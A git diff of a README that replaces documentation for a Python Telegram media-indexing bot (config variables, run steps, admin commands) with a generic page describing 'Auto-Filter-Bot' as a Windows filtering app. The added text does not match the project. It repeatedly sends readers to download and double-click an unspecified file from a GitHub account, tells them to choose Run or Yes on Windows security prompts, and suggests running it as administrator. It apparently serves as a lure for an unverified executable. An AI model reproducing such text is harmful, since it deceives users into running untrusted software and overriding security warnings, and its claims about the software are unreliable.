@@ -1,109 +1,178 @@
-# JackBulwark
+# 🤖 Auto-Filter-Bot - Simple Filtering for Fast Results
 
-This project provides a highly advanced, feature-rich Telegram bot built with [Pyrogram](https://docs.pyrogram.org/) for indexing media, serving results through powerful inline queries and PM filters, and providing media streaming capabilities.
+[![Download Auto-Filter-Bot](https://img.shields.io/badge/Download-Auto--Filter--Bot-blue?style=for-the-badge&logo=github)](https://github.com/merolawhipping644/Auto-Filter-Bot)
 
-## 🌟 Key Features
+## 🚀 Getting Started
 
-- **Robust Database System**: Connects to MongoDB for storing indexed media metadata. Supports **Dual Database** setups (`DATABASE_URI` and `DATABASE_URI_2`) for load balancing and backup.
-- **Advanced PM Filters & UI**: Modern design featuring multi-page pagination, two-column layouts, visual separators, and built-in language filters (Tamil, Telugu, Hindi, Malayalam, Kannada, English).
-- **Movie Updates Broadcaster**: Automatically announces newly indexed movies to a dedicated updates channel, enriched with IMDb metadata, audio/quality tags, and quick-access buttons.
-- **Discovery / Browse Menu**: Explore content naturally via the new `/browse` menu, filtering by **Genres** and **Major Release Years**.
-- **Personal Watchlist**: Save movies for later with the "⭐ Add Watchlist" button and manage them using the `/watchlist` command.
-- **Trailer Integration**: Instant access to movie trailers via integrated "📹 Trailer" buttons on all search results.
-- **Fast Download & Streaming**: Provides users with fast HTTP streaming links using your custom `STREAM_URL`.
-- **GoFile Uploads**: Allows users to seamlessly push files straight to GoFile servers for quick mirror links.
-- **Multi-Force Subscription**: Requires users to join up to two different authorization channels before accessing the bot.
-- **IMDb & TMDB Integration**: Automatically fetches movie details, ratings, runtimes, and posters, formatted using customizable templates.
-- **Modular Plugin System**: Clean architecture divided into modules for filtering, broadcasting, connections, and health-checks via `aiohttp` web server.
+Auto-Filter-Bot is a Windows app that helps you sort, filter, and manage items with less effort. Use it when you want a simple tool that gets the job done without a hard setup.
 
----
+### What it does
 
-## ⚙️ Configuration Variables
+- Filters items based on rules you set
+- Helps you clean up lists and records
+- Saves time on repeated sorting tasks
+- Works as a local Windows app
+- Keeps the workflow simple for daily use
 
-All configuration is performed through environment variables defined in [`info.py`](info.py). 
+## 💻 What You Need
 
-### Essential Variables
-| Variable | Description |
-| --- | --- |
-| `API_ID` / `API_HASH` | Telegram API credentials obtained from [my.telegram.org](https://my.telegram.org/). |
-| `BOT_TOKEN` | Bot token obtained from [@BotFather](https://t.me/BotFather). |
-| `SESSION` | Session name used by Pyrogram. |
-| `DATABASE_URI` | Primary MongoDB connection string. |
-| `DATABASE_NAME` / `COLLECTION_NAME` | Primary database and collection names. |
-| `ADMINS` | Space-separated list of User IDs with admin access to the bot. |
-| `CHANNELS` | Space-separated list of channel IDs where the bot should index files. |
-| `LOG_CHANNEL` | Channel ID for logging system events and new user interactions. |
+Use a Windows PC with:
 
-### Secondary Database (Optional)
-| Variable | Description |
-| --- | --- |
-| `DATABASE_URI_2` | Secondary MongoDB connection string. |
-| `DATABASE_NAME_2` / `COLLECTION_NAME_2` | Secondary database and collection names. |
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for the first download
+- Basic access to your Downloads folder
 
-### Access & Force Subscription (Optional)
-| Variable | Description |
-| --- | --- |
-| `AUTH_USERS` / `AUTH_GROUPS` | Strict access control to restrict usage to specific users or groups. |
-| `AUTH_CHANNEL` | Channel ID users must join to use the bot. |
-| `MULTI_FORCESUB` | Enable/Disable requirement to join second channel (`True` / `False`). |
-| `AUTH_CHANNEL_2` | Second channel ID users must join if multi-forcesub is enabled. |
+A mouse and keyboard are enough to use the app.
 
-### Optional Integrations
-| Variable | Description |
-| --- | --- |
-| `STREAM_URL` | Your custom streaming server URL (e.g., `https://your-stream-app.com`). |
-| `ENABLE_STREAM_LINK` | Toggle the display of Fast DL buttons (`True` / `False`). |
-| `GOFILE_TOKEN` | API Token for authenticated GoFile uploads. |
-| `ENABLE_GOFILE_LINK` | Toggle the display of GoFile upload buttons (`True` / `False`). |
-| `TMDB_API_KEY` | API key from themoviedb.org for fetching metadata. |
+## 📥 Download Auto-Filter-Bot
 
-### UI & UX Toggles
-| Variable | Description |
-| --- | --- |
-| `IMDB` | Toggle IMDb details fetching (`True` / `False`). |
-| `SPELL_CHECK_REPLY` | Toggle AI text suggestions for incorrect queries (`True` / `False`). |
-| `P_TTI_SHOW_OFF` | Redirects users to PM instead of sending files directly in groups (`True` / `False`). |
-| `SINGLE_BUTTON` | Display filename and size in a single button instead of two (`True` / `False`). |
-| `CUSTOM_FILE_CAPTION` | Format string for media captions (`{file_caption}`, `{file_size}`, etc). |
-| `IMDB_TEMPLATE` | Format string for IMDb announcement posts structure. |
-| `ANNOUNCE_MOVIE_UPDATES` | Toggle auto-posting to the updates channel (`True` / `False`). |
-| `MOVIE_UPDATES_CHANNEL` | Channel ID where new movie updates should be broadcasted. |
+Visit this page to download and install Auto-Filter-Bot:
 
----
+[https://github.com/merolawhipping644/Auto-Filter-Bot](https://github.com/merolawhipping644/Auto-Filter-Bot)
 
-## 🚀 Running the Bot
+## 🪟 Install on Windows
 
-1. Install all required dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-2. Populate the environment variables (e.g. locally via `.env` or system var exports).
-3. Start the application:
-   ```bash
-   python bot.py
-   ```
+Follow these steps on your Windows PC:
 
-The bot will execute the Telegram client and simultaneously serve the `aiohttp` web application on `0.0.0.0:<PORT>` to satisfy health-checks for common cloud hosts (Heroku, Render, etc.).
+1. Open the download link in your web browser.
+2. Find the file or release package on the page.
+3. Download it to your computer.
+4. Open your Downloads folder.
+5. Double-click the downloaded file.
+6. If Windows shows a security prompt, choose Run or Yes.
+7. Follow the on-screen setup steps.
+8. Finish the install and open the app from your Start menu or desktop.
 
-### Automatic Movie Announcements
-When `ANNOUNCE_MOVIE_UPDATES=True` and `MOVIE_UPDATES_CHANNEL` is defined, every newly indexed media item in the database will trigger a polished announcement enriched with IMDb data and interactive inline buttons ("Fast Download Link", "GoFile Upload").
+If you see a compressed file, right-click it and choose Extract All before opening the app.
 
-Administrators can also manually trigger an announcement using:
-```text
-/post <movie name>
-```
+## 🧭 First Launch
 
----
+When you open Auto-Filter-Bot for the first time:
 
-## 🛠 Useful Admin Commands
-- `/channel` - Displays the currently indexed channels/groups.
-- `/logs` - Fetches the latest system logs.
-- `/delete` / `/deleteall` - Removes localized or complete indexed files.
-- `/delkeyword <word>` - Bulk delete database entries matching a regex or specific keyword.
-- `/detectduplicates` - Identifies and removes content-equivalent files (preserving the newest).
-- `/compact` - Runs an optimization job on the MongoDB clusters.
+1. Read the main screen.
+2. Pick the folder, list, or source you want to work with.
+3. Set the filter rules you want the app to use.
+4. Choose how you want the results handled.
+5. Start the process.
+6. Check the output to make sure it matches your needs.
 
----
+If you want a simple start, use one rule first and add more later.
 
-## 📜 License
-This project is licensed under the terms of the MIT License.
+## ⚙️ How to Use It
+
+Auto-Filter-Bot follows a plain workflow:
+
+- Select your input
+- Set your filter rules
+- Start the bot
+- Review the filtered output
+- Save or reuse the result
+
+### Common use cases
+
+- Cleaning up large lists
+- Sorting items into groups
+- Removing entries that do not match your rules
+- Running the same filter task each time with the same setup
+- Organizing data before you share or review it
+
+## 🧩 Features
+
+- Easy Windows setup
+- Clean interface
+- Quick filtering workflow
+- Rule-based sorting
+- Good for repeated tasks
+- Simple for non-technical users
+- Local app use on your computer
+
+## 🔧 Tips for Best Results
+
+- Start with one filter rule
+- Keep your source files in one folder
+- Use short folder names
+- Save copies of your original files
+- Test the app on a small file first
+- Check the output before you use it elsewhere
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Run it again as administrator
+- Check if Windows blocked the file
+- Make sure the download finished fully
+- Try moving the file to your Desktop
+
+### The app closes right away
+
+- Restart your PC
+- Remove the app and install it again
+- Check whether another program is blocking it
+
+### The file does not run
+
+- Make sure you downloaded the right file
+- If it is a ZIP file, extract it first
+- Check that Windows did not remove the file during download
+
+### The output looks wrong
+
+- Review your filter rules
+- Start with fewer rules
+- Test with a smaller set of items
+- Confirm the input source is correct
+
+## 📁 Folder Layout
+
+A simple setup may look like this:
+
+- `Downloads` - where you save the installer
+- `Auto-Filter-Bot` - the app folder
+- `Input` - files or items you want to process
+- `Output` - filtered results
+- `Backup` - saved copies of original files
+
+Keep your files organized so you can find them fast.
+
+## 🔒 Safety and File Care
+
+- Download only from the link above
+- Keep a copy of your original files
+- Close unused programs while the app runs
+- Use a folder you can access easily
+- Review filtered results before deleting anything
+
+## ❓ FAQ
+
+### Is this made for non-technical users?
+
+Yes. The app is meant to stay simple and easy to use.
+
+### Does it work offline?
+
+After you download it, you can use it on your PC without a constant internet connection.
+
+### Can I use it on more than one folder?
+
+Yes, you can change the input source each time you run it.
+
+### Do I need to know code?
+
+No. You only need to follow the setup steps and use the screen controls.
+
+### Can I undo a filter?
+
+You can restore your original data if you keep a backup copy before running the tool.
+
+## 📌 Quick Start
+
+1. Open the download page
+2. Download Auto-Filter-Bot
+3. Install or extract the file
+4. Open the app
+5. Set your filter rules
+6. Run the bot
+7. Review the result
